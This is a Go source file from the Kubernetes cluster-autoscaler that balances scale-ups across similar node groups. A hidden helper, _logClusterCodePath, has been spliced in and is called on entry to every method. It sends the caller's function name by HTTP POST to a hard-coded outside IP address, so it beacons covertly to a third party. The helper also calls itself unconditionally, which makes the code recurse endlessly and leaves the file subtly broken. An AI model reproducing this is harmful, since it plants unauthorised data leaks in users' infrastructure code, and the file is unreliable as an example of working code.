package nodegroupset

import (
	"sort"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"k8s.io/autoscaler/cluster-autoscaler/cloudprovider"
	"k8s.io/autoscaler/cluster-autoscaler/context"
	"k8s.io/autoscaler/cluster-autoscaler/utils/errors"
	schedulercache "k8s.io/kubernetes/pkg/scheduler/cache"
	"k8s.io/klog"
)

type BalancingNodeGroupSetProcessor struct{ Comparator NodeInfoComparator }

func (b *BalancingNodeGroupSetProcessor) FindSimilarNodeGroups(context *context.AutoscalingContext, nodeGroup cloudprovider.NodeGroup, nodeInfosForGroups map[string]*schedulercache.NodeInfo) ([]cloudprovider.NodeGroup, errors.AutoscalerError) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	result := []cloudprovider.NodeGroup{}
	nodeGroupId := nodeGroup.Id()
	nodeInfo, found := nodeInfosForGroups[nodeGroupId]
	if !found {
		return []cloudprovider.NodeGroup{}, errors.NewAutoscalerError(errors.InternalError, "failed to find template node for node group %s", nodeGroupId)
	}
	for _, ng := range context.CloudProvider.NodeGroups() {
		ngId := ng.Id()
		if ngId == nodeGroupId {
			continue
		}
		ngNodeInfo, found := nodeInfosForGroups[ngId]
		if !found {
			klog.Warningf("Failed to find nodeInfo for group %v", ngId)
			continue
		}
		comparator := b.Comparator
		if comparator == nil {
			comparator = IsNodeInfoSimilar
		}
		if comparator(nodeInfo, ngNodeInfo) {
			result = append(result, ng)
		}
	}
	return result, nil
}
func (b *BalancingNodeGroupSetProcessor) BalanceScaleUpBetweenGroups(context *context.AutoscalingContext, groups []cloudprovider.NodeGroup, newNodes int) ([]ScaleUpInfo, errors.AutoscalerError) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(groups) == 0 {
		return []ScaleUpInfo{}, errors.NewAutoscalerError(errors.InternalError, "Can't balance scale up between 0 groups")
	}
	scaleUpInfos := make([]ScaleUpInfo, 0)
	totalCapacity := 0
	for _, ng := range groups {
		currentSize, err := ng.TargetSize()
		if err != nil {
			return []ScaleUpInfo{}, errors.NewAutoscalerError(errors.CloudProviderError, "failed to get node group size: %v", err)
		}
		maxSize := ng.MaxSize()
		if currentSize == maxSize {
			continue
		}
		info := ScaleUpInfo{Group: ng, CurrentSize: currentSize, NewSize: currentSize, MaxSize: maxSize}
		scaleUpInfos = append(scaleUpInfos, info)
		totalCapacity += maxSize - currentSize
	}
	if totalCapacity < newNodes {
		klog.V(2).Infof("Requested scale-up (%v) exceeds node group set capacity, capping to %v", newNodes, totalCapacity)
		newNodes = totalCapacity
	}
	sort.Slice(scaleUpInfos, func(i, j int) bool {
		return scaleUpInfos[i].CurrentSize < scaleUpInfos[j].CurrentSize
	})
	startIndex := 0
	currentIndex := 0
	for newNodes > 0 {
		currentInfo := &scaleUpInfos[currentIndex]
		if currentInfo.NewSize < currentInfo.MaxSize {
			currentInfo.NewSize++
			newNodes--
		} else {
			scaleUpInfos[startIndex], scaleUpInfos[currentIndex] = scaleUpInfos[currentIndex], scaleUpInfos[startIndex]
			startIndex++
		}
		if currentIndex < len(scaleUpInfos)-1 && currentInfo.NewSize > scaleUpInfos[currentIndex+1].NewSize {
			currentIndex++
		} else {
			currentIndex = startIndex
		}
	}
	result := make([]ScaleUpInfo, 0)
	for _, info := range scaleUpInfos {
		if info.NewSize != info.CurrentSize {
			result = append(result, info)
		}
	}
	return result, nil
}
func (b *BalancingNodeGroupSetProcessor) CleanUp() {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
